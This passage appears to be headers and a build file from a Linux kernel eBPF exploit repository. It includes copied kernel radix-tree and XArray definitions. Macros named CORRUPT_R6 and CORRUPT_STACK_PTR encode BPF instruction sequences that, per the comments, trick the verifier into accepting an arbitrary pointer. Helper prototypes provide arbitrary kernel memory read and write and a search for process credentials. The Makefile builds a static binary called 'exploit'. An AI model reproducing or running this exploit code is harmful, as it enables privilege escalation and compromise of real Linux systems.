#define BPF_ALU_REG(OP, DST, SRC, INS_CLASS)				\
    ((struct bpf_insn) {					\
     .code  = INS_CLASS | BPF_OP(OP) | BPF_X,	\
     .dst_reg = DST,					\
     .src_reg = SRC,					\
     .off   = 0,					\
     .imm   = 0 })

#define BPF_EXIT_INSN()						\
    ((struct bpf_insn) {					\
     .code  = BPF_JMP | BPF_EXIT,			\
     .dst_reg = 0,					\
     .src_reg = 0,					\
     .off   = 0,					\
     .imm   = 0 })

#define BPF_JMP_REG(OP, DST, SRC, OFF, INS_CLASS)				\
    ((struct bpf_insn) {					\
     .code  = INS_CLASS | BPF_OP(OP) | BPF_X,		\
     .dst_reg = DST,					\
     .src_reg = SRC,					\
     .off   = OFF,					\
     .imm   = 0 })

#define BPF_JMP_IMM(OP, DST, IMM, OFF, INS_CLASS)				\
    ((struct bpf_insn) {					\
     .code  = INS_CLASS | BPF_OP(OP) | BPF_K,		\
     .dst_reg = DST,					\
     .src_reg = 0,					\
     .off   = OFF,					\
     .imm   = IMM })

#define BPF_CALL_FUNC(FUNCTION_NUMBER)						\
    ((struct bpf_insn) {					\
     .code  = BPF_JMP | BPF_CALL,			\
     .dst_reg = 0,					\
     .src_reg = 0,					\
     .off   = 0,					\
     .imm   = FUNCTION_NUMBER })

#define BPF_LD_MAP_FD(DST, MAP_FD)				\
    ((struct bpf_insn) {					\
     .code  = BPF_LD | BPF_DW | BPF_IMM,		\
     .dst_reg = DST,					\
     .src_reg = 0x01,					\
     .off   = 0,					\
     .imm   = (__u32) (MAP_FD) }),			\
     ((struct bpf_insn) {					\
      .code  = 0, /* zero is reserved opcode */	\
      .dst_reg = 0,					\
      .src_reg = 0,					\
      .off   = 0,					\
      .imm   = ((__u64) (MAP_FD)) >> 32 })

#define BPF_MEM_OPERATION(INS_CLASS, SIZE, DST, SRC, OFF)			\
    ((struct bpf_insn) {					\
     .code  = INS_CLASS | BPF_SIZE(SIZE) | BPF_MEM,	\
     .dst_reg = DST,					\
     .src_reg = SRC,					\
     .off   = OFF,					\
     .imm   = 0 })
#define BPF_MEM_IMM_OPERATION(INS_CLASS, SIZE, DST, IMM, OFF)			\
    ((struct bpf_insn) {					\
     .code  = INS_CLASS | BPF_SIZE(SIZE) | BPF_MEM,	\
     .dst_reg = DST,					\
     .src_reg = 0,					\
     .off   = OFF,					\
     .imm   = IMM })

#define CORRUPT_R6   \
    BPF_ALU_IMM(BPF_MOV, /*dst=*/BPF_REG_6, /*imm=*/149420059, /*ins_class=*/BPF_ALU64), \
    BPF_ALU_IMM(BPF_MOV, /*dst=*/BPF_REG_7, /*imm=*/3982203280, /*ins_class=*/BPF_ALU64), \
    BPF_ALU_IMM(BPF_MOV, /*dst=*/BPF_REG_8, /*imm=*/67, /*ins_class=*/BPF_ALU64), \
    BPF_ALU_IMM(BPF_MOV, /*dst=*/BPF_REG_9, /*imm=*/1042510562, /*ins_class=*/BPF_ALU64), \
    BPF_JMP_REG(BPF_JGT, /*dst=*/BPF_REG_7, /*src=*/BPF_REG_6, /*off=*/1, /*ins_class=*/BPF_JMP), \
    BPF_ALU_IMM(BPF_MUL, /*dst=*/BPF_REG_7, /*imm=*/1, /*ins_class=*/BPF_ALU), \
    BPF_JMP_REG(BPF_JEQ, /*dst=*/BPF_REG_6, /*src=*/BPF_REG_9, /*off=*/1, /*ins_class=*/BPF_JMP), \
    BPF_ALU_IMM(BPF_ADD, /*dst=*/BPF_REG_6, /*imm=*/0, /*ins_class=*/BPF_ALU), \
    BPF_ALU_IMM(BPF_MOV, /*dst=*/BPF_REG_6, /*imm=*/2613857455, /*ins_class=*/BPF_ALU64), \
    BPF_ALU_IMM(BPF_MOD, /*dst=*/BPF_REG_6, /*imm=*/698566326, /*ins_class=*/BPF_ALU64), \
    BPF_ALU_REG(BPF_RSH, /*dst=*/BPF_REG_7, /*src=*/BPF_REG_9, /*ins_class=*/BPF_ALU), \
    BPF_ALU_REG(BPF_RSH, /*dst=*/BPF_REG_9, /*src=*/BPF_REG_7, /*ins_class=*/BPF_ALU64), \
    BPF_ALU_REG(BPF_MOV, /*dst=*/BPF_REG_8, /*src=*/BPF_REG_7, /*ins_class=*/BPF_ALU64), \
    BPF_JMP_REG(BPF_JSET, /*dst=*/BPF_REG_8, /*src=*/BPF_REG_9, /*off=*/4, /*ins_class=*/BPF_JMP), \
    BPF_ALU_IMM(BPF_ADD, /*dst=*/BPF_REG_9, /*imm=*/635122136, /*ins_class=*/BPF_ALU), \
    BPF_ALU_IMM(BPF_LSH, /*dst=*/BPF_REG_9, /*imm=*/46, /*ins_class=*/BPF_ALU64), \
    BPF_ALU_IMM(BPF_MUL, /*dst=*/BPF_REG_8, /*imm=*/1, /*ins_class=*/BPF_ALU64), \
    BPF_ALU_IMM(BPF_MUL, /*dst=*/BPF_REG_8, /*imm=*/1, /*ins_class=*/BPF_ALU64), \
    BPF_JMP_REG(BPF_JNE, /*dst=*/BPF_REG_6, /*src=*/BPF_REG_9, /*off=*/2, /*ins_class=*/BPF_JMP), \
    BPF_ALU_IMM(BPF_NEG, /*dst=*/BPF_REG_6, /*imm=*/BPF_REG_0, /*ins_class=*/BPF_ALU), \
    BPF_ALU_IMM(BPF_LSH, /*dst=*/BPF_REG_9, /*imm=*/BPF_REG_7, /*ins_class=*/BPF_ALU), \
    BPF_JMP_REG(BPF_JLE, /*dst=*/BPF_REG_6, /*src=*/BPF_REG_9, /*off=*/2, /*ins_class=*/BPF_JMP), \
    BPF_ALU_IMM(BPF_MOD, /*dst=*/BPF_REG_6, /*imm=*/3021791800, /*ins_class=*/BPF_ALU), \
    BPF_ALU_IMM(BPF_RSH, /*dst=*/BPF_REG_6, /*imm=*/40, /*ins_class=*/BPF_ALU64), \
    BPF_ALU_IMM(BPF_RSH, /*dst=*/BPF_REG_6, /*imm=*/28, /*ins_class=*/BPF_ALU)

// 1. Store random scalar to stack - 8
// 2. Store (stack pointer - 8) to stack - 16
// 3. Call skb_load_bytes_relative, this will overwrite (stack - 16)
// 4. Load stack - 16 to R1, verifier thinks we have a ptr to stack - 8 here
//    hence it allows any scalar writing... but in fact we have an arbitrary
//    pointer.
#define CORRUPT_STACK_PTR \
    CORRUPT_R6, \
    BPF_ALU_REG(BPF_MOV, /*dst=*/BPF_REG_9, /*src=*/BPF_REG_1, /*ins_class=*/BPF_ALU64), \
    BPF_ALU_IMM(BPF_MOV, /*dst=*/BPF_REG_1, /*imm=*/0xCAFE, /*ins_class=*/BPF_ALU64), \
    BPF_MEM_OPERATION(BPF_STX, BPF_DW, /*dst=*/BPF_REG_10, /*src=*/BPF_REG_1, /*offset=*/-8), \
    \
    BPF_ALU_REG(BPF_MOV, /*dst=*/BPF_REG_2, /*src=*/BPF_REG_10, /*ins_class=*/BPF_ALU64), \
    BPF_ALU_IMM(BPF_ADD, /*dst=*/BPF_REG_2, /*imm=*/-8, /*ins_class=*/BPF_ALU64), \
    BPF_MEM_OPERATION(BPF_STX, BPF_DW, /*dst=*/BPF_REG_10, /*src=*/BPF_REG_2, /*offset=*/-16), \
    \
    BPF_ALU_REG(BPF_MOV, BPF_REG_1, BPF_REG_9, BPF_ALU64), \
    BPF_ALU_IMM(BPF_MOV, BPF_REG_2, 0, BPF_ALU64), \
    BPF_ALU_REG(BPF_MOV, BPF_REG_3, BPF_REG_10, BPF_ALU64), \
    BPF_ALU_IMM(BPF_ADD, BPF_REG_3, -24, BPF_ALU64), \
    BPF_ALU_REG(BPF_MOV, BPF_REG_4, BPF_REG_6, BPF_ALU64), \
    BPF_ALU_IMM(BPF_MUL, BPF_REG_4, 8, BPF_ALU64), \
    BPF_ALU_IMM(BPF_ADD, BPF_REG_4, 8, BPF_ALU64), \
    BPF_ALU_IMM(BPF_MOV, BPF_REG_5, 1, BPF_ALU64), \
    BPF_CALL_FUNC(BPF_FUNC_skb_load_bytes_relative), \
    \
    BPF_MEM_OPERATION(BPF_LDX, BPF_DW, /*dst=*/BPF_REG_1, /*src=*/BPF_REG_10, /*offset=*/-16)

typedef struct context {
    int map_fd;
    int map_size;

    int read_fd;

    void *kernel_memory;
    int kernel_page_size;
    int kernel_allocated_pages;

    uint64_t init_pid_fs;
    uint64_t init_pid_cap_inh;
    uint64_t init_pid_cap_perm;
    uint64_t init_pid_cap_eff;

    uint64_t map_leak;
    uint64_t ops_leak;
    uint64_t init_proc_ns_kstrtab;
    uint64_t init_proc_ns_addr;
    uint64_t task_addr;
    uint64_t creds_addr;
} context;

int load_prog(struct bpf_insn *instructions, size_t insn_count);

int bpf_create_map(unsigned int max_entries); 

int get_map_contents(context *ctx, uint64_t *contents); 

int setup_send_sock(); 

int setup_listener_sock(); 

int bpf_prog_skb_run(int prog_fd, const void *data, size_t size); 

int execute_bpf_program(context* ctx, int prog_fd, uint64_t *map_contents, void *data, int data_len); 

int prepare_read(context *ctx); 

int write_to_address(context *ctx, uint64_t target_address, uint64_t value); 

int read_from_address(context *ctx, uint64_t target_address, uint64_t* value); 

int kernel_read_bytes(context *ctx, uint64_t target_address, void *destination, uint64_t size);
#endif

=== FILE: include/kernel_helpers.h ===
#ifndef _KERNEL_HELPERS_
#define _KERNEL_HELPERS_

#include "exploit_prims.h"

#define XA_CHUNK_SHIFT 0x6
#define XA_CHUNK_SIZE  0x40

#define XA_RETRY_ENTRY xa_mk_internal(256)

#define RADIX_TREE_RETRY       XA_RETRY_ENTRY
#define RADIX_TREE_MAP_SHIFT   XA_CHUNK_SHIFT
#define RADIX_TREE_MAP_SIZE    (1UL << RADIX_TREE_MAP_SHIFT)
#define RADIX_TREE_MAP_MASK    (RADIX_TREE_MAP_SIZE-1)


/*
 * The bottom two bits of the slot determine how the remaining bits in the
 * slot are interpreted:
 *
 * 00 - data pointer
 * 10 - internal entry
 * x1 - value entry
 *
 * The internal entry may be a pointer to the next level in the tree, a
 * sibling entry, or an indicator that the entry in this slot has been moved
 * to another location in the tree and the lookup should be restarted.  While
 * NULL fits the 'data pointer' pattern, it means that there is no entry in
 * the tree for this index (no matter what level of the tree it is found at).
 * This means that storing a NULL entry in the tree is the same as deleting
 * the entry from the tree.
 */
#define RADIX_TREE_ENTRY_MASK    3UL
#define RADIX_TREE_INTERNAL_NODE 2UL


/**
 * struct xarray - The anchor of the XArray.
 * @xa_lock: Lock that protects the contents of the XArray.
 *
 * To use the xarray, define it statically or embed it in your data structure.
 * It is a very small data structure, so it does not usually make sense to
 * allocate it separately and keep a pointer to it in your data structure.
 *
 * You may use the xa_lock to protect your own data structures as well.
 */
/*
 * If all of the entries in the array are NULL, @xa_head is a NULL pointer.
 * If the only non-NULL entry in the array is at index 0, @xa_head is that
 * entry.  If any other entry in the array is non-NULL, @xa_head points
 * to an @xa_node.
 */
struct xarray 
{
    int32_t    xa_lock;
    int32_t    xa_flags;
    void     *xa_head;
};


/*
 * xa_mk_internal() - Create an internal entry.
 * @v: Value to turn into an internal entry.
 *
 * Internal entries are used for a number of purposes.  Entries 0-255 are
 * used for sibling entries (only 0-62 are used by the current code).  256
 * is used for the retry entry.  257 is used for the reserved / zero entry.
 * Negative internal entries are used to represent errnos.  Node pointers
 * are also tagged as internal entries in some situations.
 *
 * Context: Any context.
 * Return: An XArray internal entry corresponding to this value.
 */
static inline void *xa_mk_internal(unsigned long v)
{
    return (void *)((v << 2) | 2);
}

#define radix_tree_root        xarray
#define radix_tree_node        xa_node


struct xa_node 
{
    unsigned char    shift;        /* Bits remaining in each slot */
    unsigned char    offset;       /* Slot offset in parent */
    unsigned char    count;        /* Total entry count */
    unsigned char    nr_values;    /* Value entry count */
    struct xa_node  *parent;       /* NULL at top of tree */
    struct xarray    *array;       /* The array we belong to */
    char filler[0x10];
    void *slots[XA_CHUNK_SIZE];
}; 

struct idr 
{
    struct radix_tree_root    idr_rt;
    unsigned int        idr_base;
    unsigned int        idr_next;
};

struct pid_namespace
{
    struct idr idr;
};

struct pid *find_pid_ns(context *ctx, int process_id);


#endif

=== FILE: include/radix-tree.h ===
/* SPDX-License-Identifier: GPL-2.0-or-later */
/*
 * Copyright (C) 2001 Momchil Velikov
 * Portions Copyright (C) 2001 Christoph Hellwig
 * Copyright (C) 2006 Nick Piggin
 * Copyright (C) 2012 Konstantin Khlebnikov
 */
#ifndef _LINUX_RADIX_TREE_H
#define _LINUX_RADIX_TREE_H

#include <linux/bitops.h>
#include <linux/gfp_types.h>
#include <linux/list.h>
#include <linux/lockdep.h>
#include <linux/math.h>
#include <linux/percpu.h>
#include <linux/preempt.h>
#include <linux/rcupdate.h>
#include <linux/spinlock.h>
#include <linux/types.h>
#include <linux/xarray.h>
#include <linux/local_lock.h>

/* Keep unconverted code working */
#define radix_tree_root		xarray
#define radix_tree_node		xa_node

struct radix_tree_preload {
	local_lock_t lock;
	unsigned nr;
	/* nodes->parent points to next preallocated node */
	struct radix_tree_node *nodes;
};
DECLARE_PER_CPU(struct radix_tree_preload, radix_tree_preloads);

/*
 * The bottom two bits of the slot determine how the remaining bits in the
 * slot are interpreted:
 *
 * 00 - data pointer
 * 10 - internal entry
 * x1 - value entry
 *
 * The internal entry may be a pointer to the next level in the tree, a
 * sibling entry, or an indicator that the entry in this slot has been moved
 * to another location in the tree and the lookup should be restarted.  While
 * NULL fits the 'data pointer' pattern, it means that there is no entry in
 * the tree for this index (no matter what level of the tree it is found at).
 * This means that storing a NULL entry in the tree is the same as deleting
 * the entry from the tree.
 */
#define RADIX_TREE_ENTRY_MASK		3UL
#define RADIX_TREE_INTERNAL_NODE	2UL

static inline bool radix_tree_is_internal_node(void *ptr)
{
	return ((unsigned long)ptr & RADIX_TREE_ENTRY_MASK) ==
				RADIX_TREE_INTERNAL_NODE;
}

/*** radix-tree API starts here ***/

#define RADIX_TREE_MAP_SHIFT	XA_CHUNK_SHIFT
#define RADIX_TREE_MAP_SIZE	(1UL << RADIX_TREE_MAP_SHIFT)
#define RADIX_TREE_MAP_MASK	(RADIX_TREE_MAP_SIZE-1)

#define RADIX_TREE_MAX_TAGS	XA_MAX_MARKS
#define RADIX_TREE_TAG_LONGS	XA_MARK_LONGS

#define RADIX_TREE_INDEX_BITS  (8 /* CHAR_BIT */ * sizeof(unsigned long))
#define RADIX_TREE_MAX_PATH (DIV_ROUND_UP(RADIX_TREE_INDEX_BITS, \
					  RADIX_TREE_MAP_SHIFT))

/* The IDR tag is stored in the low bits of xa_flags */
#define ROOT_IS_IDR	((__force gfp_t)4)
/* The top bits of xa_flags are used to store the root tags */
#define ROOT_TAG_SHIFT	(__GFP_BITS_SHIFT)

#define RADIX_TREE_INIT(name, mask)	XARRAY_INIT(name, mask)

#define RADIX_TREE(name, mask) \
	struct radix_tree_root name = RADIX_TREE_INIT(name, mask)

#define INIT_RADIX_TREE(root, mask) xa_init_flags(root, mask)

static inline bool radix_tree_empty(const struct radix_tree_root *root)
{
	return root->xa_head == NULL;
}

/**
 * struct radix_tree_iter - radix tree iterator state
 *
 * @index:	index of current slot
 * @next_index:	one beyond the last index for this chunk
 * @tags:	bit-mask for tag-iterating
 * @node:	node that contains current slot
 *
 * This radix tree iterator works in terms of "chunks" of slots.  A chunk is a
 * subinterval of slots contained within one radix tree leaf node.  It is
 * described by a pointer to its first slot and a struct radix_tree_iter
 * which holds the chunk's position in the tree and its size.  For tagged
 * iteration radix_tree_iter also holds the slots' bit-mask for one chosen
 * radix tree tag.
 */
struct radix_tree_iter {
	unsigned long	index;
	unsigned long	next_index;
	unsigned long	tags;
	struct radix_tree_node *node;
};

/**
 * Radix-tree synchronization
 *
 * The radix-tree API requires that users provide all synchronisation (with
 * specific exceptions, noted below).
 *
 * Synchronization of access to the data items being stored in the tree, and
 * management of their lifetimes must be completely managed by API users.
 *
 * For API usage, in general,
 * - any function _modifying_ the tree or tags (inserting or deleting
 *   items, setting or clearing tags) must exclude other modifications, and
 *   exclude any functions reading the tree.
 * - any function _reading_ the tree or tags (looking up items or tags,
 *   gang lookups) must exclude modifications to the tree, but may occur
 *   concurrently with other readers.
 *
 * The notable exceptions to this rule are the following functions:
 * __radix_tree_lookup
 * radix_tree_lookup
 * radix_tree_lookup_slot
 * radix_tree_tag_get
 * radix_tree_gang_lookup
 * radix_tree_gang_lookup_tag
 * radix_tree_gang_lookup_tag_slot
 * radix_tree_tagged
 *
 * The first 7 functions are able to be called locklessly, using RCU. The
 * caller must ensure calls to these functions are made within rcu_read_lock()
 * regions. Other readers (lock-free or otherwise) and modifications may be
 * running concurrently.
 *
 * It is still required that the caller manage the synchronization and lifetimes
 * of the items. So if RCU lock-free lookups are used, typically this would mean
 * that the items have their own locks, or are amenable to lock-free access; and
 * that the items are freed by RCU (or only freed after having been deleted from
 * the radix tree *and* a synchronize_rcu() grace period).
 *
 * (Note, rcu_assign_pointer and rcu_dereference are not needed to control
 * access to data items when inserting into or looking up from the radix tree)
 *
 * Note that the value returned by radix_tree_tag_get() may not be relied upon
 * if only the RCU read lock is held.  Functions to set/clear tags and to
 * delete nodes running concurrently with it may affect its result such that
 * two consecutive reads in the same locked section may return different
 * values.  If reliability is required, modification functions must also be
 * excluded from concurrency.
 *
 * radix_tree_tagged is able to be called without locking or RCU.
 */

/**
 * radix_tree_deref_slot - dereference a slot
 * @slot: slot pointer, returned by radix_tree_lookup_slot
 *
 * For use with radix_tree_lookup_slot().  Caller must hold tree at least read
 * locked across slot lookup and dereference. Not required if write lock is
 * held (ie. items cannot be concurrently inserted).
 *
 * radix_tree_deref_retry must be used to confirm validity of the pointer if
 * only the read lock is held.
 *
 * Return: entry stored in that slot.
 */
static inline void *radix_tree_deref_slot(void __rcu **slot)
{
	return rcu_dereference(*slot);
}

/**
 * radix_tree_deref_slot_protected - dereference a slot with tree lock held
 * @slot: slot pointer, returned by radix_tree_lookup_slot
 *
 * Similar to radix_tree_deref_slot.  The caller does not hold the RCU read
 * lock but it must hold the tree lock to prevent parallel updates.
 *
 * Return: entry stored in that slot.
 */
static inline void *radix_tree_deref_slot_protected(void __rcu **slot,
							spinlock_t *treelock)
{
	return rcu_dereference_protected(*slot, lockdep_is_held(treelock));
}

/**
 * radix_tree_deref_retry	- check radix_tree_deref_slot
 * @arg:	pointer returned by radix_tree_deref_slot
 * Returns:	0 if retry is not required, otherwise retry is required
 *
 * radix_tree_deref_retry must be used with radix_tree_deref_slot.
 */
static inline int radix_tree_deref_retry(void *arg)
{
	return unlikely(radix_tree_is_internal_node(arg));
}

/**
 * radix_tree_exception	- radix_tree_deref_slot returned either exception?
 * @arg:	value returned by radix_tree_deref_slot
 * Returns:	0 if well-aligned pointer, non-0 if either kind of exception.
 */
static inline int radix_tree_exception(void *arg)
{
	return unlikely((unsigned long)arg & RADIX_TREE_ENTRY_MASK);
}

int radix_tree_insert(struct radix_tree_root *, unsigned long index,
			void *);
void *__radix_tree_lookup(const struct radix_tree_root *, unsigned long index,
			  struct radix_tree_node **nodep, void __rcu ***slotp);
void *radix_tree_lookup(const struct radix_tree_root *, unsigned long);
void __rcu **radix_tree_lookup_slot(const struct radix_tree_root *,
					unsigned long index);
void __radix_tree_replace(struct radix_tree_root *, struct radix_tree_node *,
			  void __rcu **slot, void *entry);
void radix_tree_iter_replace(struct radix_tree_root *,
		const struct radix_tree_iter *, void __rcu **slot, void *entry);
void radix_tree_replace_slot(struct radix_tree_root *,
			     void __rcu **slot, void *entry);
void radix_tree_iter_delete(struct radix_tree_root *,
			struct radix_tree_iter *iter, void __rcu **slot);
void *radix_tree_delete_item(struct radix_tree_root *, unsigned long, void *);
void *radix_tree_delete(struct radix_tree_root *, unsigned long);
unsigned int radix_tree_gang_lookup(const struct radix_tree_root *,
			void **results, unsigned long first_index,
			unsigned int max_items);
int radix_tree_preload(gfp_t gfp_mask);
int radix_tree_maybe_preload(gfp_t gfp_mask);
void radix_tree_init(void);
void *radix_tree_tag_set(struct radix_tree_root *,
			unsigned long index, unsigned int tag);
void *radix_tree_tag_clear(struct radix_tree_root *,
			unsigned long index, unsigned int tag);
int radix_tree_tag_get(const struct radix_tree_root *,
			unsigned long index, unsigned int tag);
void radix_tree_iter_tag_clear(struct radix_tree_root *,
		const struct radix_tree_iter *iter, unsigned int tag);
unsigned int radix_tree_gang_lookup_tag(const struct radix_tree_root *,
		void **results, unsigned long first_index,
		unsigned int max_items, unsigned int tag);
unsigned int radix_tree_gang_lookup_tag_slot(const struct radix_tree_root *,
		void __rcu ***results, unsigned long first_index,
		unsigned int max_items, unsigned int tag);
int radix_tree_tagged(const struct radix_tree_root *, unsigned int tag);

static inline void radix_tree_preload_end(void)
{
	local_unlock(&radix_tree_preloads.lock);
}

void __rcu **idr_get_free(struct radix_tree_root *root,
			      struct radix_tree_iter *iter, gfp_t gfp,
			      unsigned long max);

enum {
	RADIX_TREE_ITER_TAG_MASK = 0x0f,	/* tag index in lower nybble */
	RADIX_TREE_ITER_TAGGED   = 0x10,	/* lookup tagged slots */
	RADIX_TREE_ITER_CONTIG   = 0x20,	/* stop at first hole */
};

/**
 * radix_tree_iter_init - initialize radix tree iterator
 *
 * @iter:	pointer to iterator state
 * @start:	iteration starting index
 * Returns:	NULL
 */
static __always_inline void __rcu **
radix_tree_iter_init(struct radix_tree_iter *iter, unsigned long start)
{
	/*
	 * Leave iter->tags uninitialized. radix_tree_next_chunk() will fill it
	 * in the case of a successful tagged chunk lookup.  If the lookup was
	 * unsuccessful or non-tagged then nobody cares about ->tags.
	 *
	 * Set index to zero to bypass next_index overflow protection.
	 * See the comment in radix_tree_next_chunk() for details.
	 */
	iter->index = 0;
	iter->next_index = start;
	return NULL;
}

/**
 * radix_tree_next_chunk - find next chunk of slots for iteration
 *
 * @root:	radix tree root
 * @iter:	iterator state
 * @flags:	RADIX_TREE_ITER_* flags and tag index
 * Returns:	pointer to chunk first slot, or NULL if there no more left
 *
 * This function looks up the next chunk in the radix tree starting from
 * @iter->next_index.  It returns a pointer to the chunk's first slot.
 * Also it fills @iter with data about chunk: position in the tree (index),
 * its end (next_index), and constructs a bit mask for tagged iterating (tags).
 */
void __rcu **radix_tree_next_chunk(const struct radix_tree_root *,
			     struct radix_tree_iter *iter, unsigned flags);

/**
 * radix_tree_iter_lookup - look up an index in the radix tree
 * @root: radix tree root
 * @iter: iterator state
 * @index: key to look up
 *
 * If @index is present in the radix tree, this function returns the slot
 * containing it and updates @iter to describe the entry.  If @index is not
 * present, it returns NULL.
 */
static inline void __rcu **
radix_tree_iter_lookup(const struct radix_tree_root *root,
			struct radix_tree_iter *iter, unsigned long index)
{
	radix_tree_iter_init(iter, index);
	return radix_tree_next_chunk(root, iter, RADIX_TREE_ITER_CONTIG);
}

/**
 * radix_tree_iter_retry - retry this chunk of the iteration
 * @iter:	iterator state
 *
 * If we iterate over a tree protected only by the RCU lock, a race
 * against deletion or creation may result in seeing a slot for which
 * radix_tree_deref_retry() returns true.  If so, call this function
 * and continue the iteration.
 */
static inline __must_check
void __rcu **radix_tree_iter_retry(struct radix_tree_iter *iter)
{
	iter->next_index = iter->index;
	iter->tags = 0;
	return NULL;
}

static inline unsigned long
__radix_tree_iter_add(struct radix_tree_iter *iter, unsigned long slots)
{
	return iter->index + slots;
}

/**
 * radix_tree_iter_resume - resume iterating when the chunk may be invalid
 * @slot: pointer to current slot
 * @iter: iterator state
 * Returns: New slot pointer
 *
 * If the iterator needs to release then reacquire a lock, the chunk may
 * have been invalidated by an insertion or deletion.  Call this function
 * before releasing the lock to continue the iteration from the next index.
 */
void __rcu **__must_check radix_tree_iter_resume(void __rcu **slot,
					struct radix_tree_iter *iter);

/**
 * radix_tree_chunk_size - get current chunk size
 *
 * @iter:	pointer to radix tree iterator
 * Returns:	current chunk size
 */
static __always_inline long
radix_tree_chunk_size(struct radix_tree_iter *iter)
{
	return iter->next_index - iter->index;
}

/**
 * radix_tree_next_slot - find next slot in chunk
 *
 * @slot:	pointer to current slot
 * @iter:	pointer to iterator state
 * @flags:	RADIX_TREE_ITER_*, should be constant
 * Returns:	pointer to next slot, or NULL if there no more left
 *
 * This function updates @iter->index in the case of a successful lookup.
 * For tagged lookup it also eats @iter->tags.
 *
 * There are several cases where 'slot' can be passed in as NULL to this
 * function.  These cases result from the use of radix_tree_iter_resume() or
 * radix_tree_iter_retry().  In these cases we don't end up dereferencing
 * 'slot' because either:
 * a) we are doing tagged iteration and iter->tags has been set to 0, or
 * b) we are doing non-tagged iteration, and iter->index and iter->next_index
 *    have been set up so that radix_tree_chunk_size() returns 1 or 0.
 */
static __always_inline void __rcu **radix_tree_next_slot(void __rcu **slot,
				struct radix_tree_iter *iter, unsigned flags)
{
	if (flags & RADIX_TREE_ITER_TAGGED) {
		iter->tags >>= 1;
		if (unlikely(!iter->tags))
			return NULL;
		if (likely(iter->tags & 1ul)) {
			iter->index = __radix_tree_iter_add(iter, 1);
			slot++;
			goto found;
		}
		if (!(flags & RADIX_TREE_ITER_CONTIG)) {
			unsigned offset = __ffs(iter->tags);

			iter->tags >>= offset++;
			iter->index = __radix_tree_iter_add(iter, offset);
			slot += offset;
			goto found;
		}
	} else {
		long count = radix_tree_chunk_size(iter);

		while (--count > 0) {
			slot++;
			iter->index = __radix_tree_iter_add(iter, 1);

			if (likely(*slot))
				goto found;
			if (flags & RADIX_TREE_ITER_CONTIG) {
				/* forbid switching to the next chunk */
				iter->next_index = 0;
				break;
			}
		}
	}
	return NULL;

 found:
	return slot;
}

/**
 * radix_tree_for_each_slot - iterate over non-empty slots
 *
 * @slot:	the void** variable for pointer to slot
 * @root:	the struct radix_tree_root pointer
 * @iter:	the struct radix_tree_iter pointer
 * @start:	iteration starting index
 *
 * @slot points to radix tree slot, @iter->index contains its index.
 */
#define radix_tree_for_each_slot(slot, root, iter, start)		\
	for (slot = radix_tree_iter_init(iter, start) ;			\
	     slot || (slot = radix_tree_next_chunk(root, iter, 0)) ;	\
	     slot = radix_tree_next_slot(slot, iter, 0))

/**
 * radix_tree_for_each_tagged - iterate over tagged slots
 *
 * @slot:	the void** variable for pointer to slot
 * @root:	the struct radix_tree_root pointer
 * @iter:	the struct radix_tree_iter pointer
 * @start:	iteration starting index
 * @tag:	tag index
 *
 * @slot points to radix tree slot, @iter->index contains its index.
 */
#define radix_tree_for_each_tagged(slot, root, iter, start, tag)	\
	for (slot = radix_tree_iter_init(iter, start) ;			\
	     slot || (slot = radix_tree_next_chunk(root, iter,		\
			      RADIX_TREE_ITER_TAGGED | tag)) ;		\
	     slot = radix_tree_next_slot(slot, iter,			\
				RADIX_TREE_ITER_TAGGED | tag))

#endif /* _LINUX_RADIX_TREE_H */

=== FILE: Makefile ===
all:
	gcc -static -o exploit -I include/ exploit_prims.c exploit.c kernel_helpers.c
```

